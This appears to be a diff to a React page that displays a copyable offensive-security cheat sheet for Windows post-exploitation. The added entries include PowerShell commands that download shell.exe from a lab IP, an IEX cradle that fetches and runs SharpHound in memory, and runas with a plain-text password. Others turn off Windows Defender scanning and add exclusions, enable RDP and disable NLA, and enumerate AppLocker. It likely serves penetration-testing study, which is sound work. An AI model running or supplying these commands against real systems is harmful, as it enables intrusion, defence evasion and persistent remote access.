@@ -21,7 +21,22 @@ export default (props) => {
 
 	// windows wget like
 	const powershell_http_dl = ' Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ';
+	const powershell_http_dl2 = ' iwr "http://10.10.10.10/shell.exe" -usebasicparsing -OutFile "shell.exe" ';
 	const cmd_cert_http_dl = 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe';
+
+	//runas
+	const runas =' $secpasswd = ConvertTo-SecureString "alicepassword" -AsPlainText -Force;$mycreds = New-Object System.Management.Automation.PSCredential ("alice",$secpasswd);$computer = ".";[System.Diagnostics.Process]::Start("whoami",$mycreds.Username, $mycreds.Password, $computer)';
+
+	//Execute in memory
+	const psram = 'IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.8.60/SharpHound.ps1\'); Invoke-BloodHound -CollectionMethod All';
+
+	//Langmode
+	const langmode = '$ExecutionContext.SessionState.LanguageMode';
+
+	//Applocker
+	const rulecollections = '(Get-AppLockerPolicy -effective).RuleCollections';
+	const applockerxml = 'Get-AppLockerPolicy -Effective -Xml';
+	const testapplocker = 'Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\\Windows\\System32\\*.exe -User Everyone';
 
 	// domain enum
 	const domain_name = `Get-NetDomain`;
@@ -51,6 +66,19 @@ export default (props) => {
 	const ACL_user_enum = `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`;
 	const ACL_gpoedit_rights = `Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`;
 	const ACL_passwd_edit_rights = `Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"`;
+
+	//AV
+	const disableAV = 'Set-MpPreference -DisableRealtimeMonitoring $true';
+	const checkStatus = 'Get-MpComputerStatus';
+	const getpreferences = 'Get-MpPreference';
+	const setexclutionpath = 'Set-MpPreference -ExclusionPath C:\\Users';
+	const excludeext = 'Set-MpPreference -ExclusionExtension docx';
+	const disablearchive = 'Set-MpPreference -DisableArchiveScanning $true';
+
+	//RDP
+	const enableRDP = 'Set-ItemProperty -Path \'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\'-name "fDenyTSConnections" -Value 0';
+	const fwRDP = 'Enable-NetFirewallRule -DisplayGroup "Remote Desktop"';
+	const disableNLA = '(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\\cimv2\\terminalservices -ComputerName . -Filter "TerminalName=\'RDP-tcp\'").SetUserAuthenticationRequired(0)';
 
 	return (
 		<QueueAnim delay={300} duration={1500}>
@@ -92,6 +120,10 @@ export default (props) => {
 				<Title level={4}>HTTP download (wget like)</Title>
 				<Paragraph copyable ellipsis={true}>
 					{powershell_http_dl}
+				</Paragraph>
+				<Title level={4}>HTTP download (wget like)</Title>
+				<Paragraph copyable ellipsis={true}>
+				{powershell_http_dl2}
 				</Paragraph>
 				<Text strong># Cmd compatible</Text>
 				<Paragraph copyable ellipsis={true}>
@@ -226,6 +258,74 @@ export default (props) => {
 				<Paragraph copyable ellipsis={true}>
 					{ACL_passwd_edit_rights}
 				</Paragraph>
+
+				<Title level={4}> Run as other user</Title>
+				<Paragraph copyable ellipsis={true}>
+				{runas}
+				</Paragraph>
+				<Title level={4}> Download and execute PSScript in memory</Title>
+				<Paragraph copyable ellipsis={true}>
+				{psram}
+				</Paragraph>
+				
+				<Title level={4}> Check language mode</Title>
+				<Paragraph copyable ellipsis={true}>
+				{langmode}
+				</Paragraph>
+				<Title level={4}>Applocker</Title>
+				<Text strong># Get Applocker Rules</Text>
+				<Paragraph copyable ellipsis={true}>
+				{rulecollections}
+				</Paragraph>
+				<Text strong># Get Applocker Rules - xml</Text>
+				<Paragraph copyable ellipsis={true}>
+				{applockerxml}
+				</Paragraph>
+				<Text strong># Test Applocker Rules</Text>
+				<Paragraph copyable ellipsis={true}>
+				{testapplocker}
+				</Paragraph>				
+				<Title level={4}> Windows Defender</Title>
+				<Text strong># Disable</Text>
+				<Paragraph copyable ellipsis={true}>
+				{disableAV}
+				</Paragraph>
+				<Text strong># Check status</Text>
+				<Paragraph copyable ellipsis={true}>
+				{checkStatus}
+				</Paragraph>
+				<Text strong># Get preferences</Text>
+				<Paragraph copyable ellipsis={true}>
+				{getpreferences}
+				</Paragraph>
+				<Text strong># Set exclutionpath</Text>
+				<Paragraph copyable ellipsis={true}>
+				{setexclutionpath}
+				</Paragraph>
+				<Text strong># Set exclution extension</Text>
+				<Paragraph copyable ellipsis={true}>
+				{excludeext}
+				</Paragraph>
+				<Text strong># Disable archivescan</Text>
+				<Paragraph copyable ellipsis={true}>
+				{disablearchive}
+				</Paragraph>
+
+				<Title level={4}> Remote Desktop</Title>
+				<Text strong># Enable RDP</Text>
+				<Paragraph copyable ellipsis={true}>
+				{enableRDP}
+				</Paragraph>
+				<Text strong># Allow through FW</Text>
+				<Paragraph copyable ellipsis={true}>
+				{fwRDP}
+				</Paragraph>
+				<Text strong># Disable NLA</Text>
+				<Paragraph copyable ellipsis={true}>
+				{disableNLA}
+				</Paragraph>
+
+			
 			</div>
 		</QueueAnim>
 	);
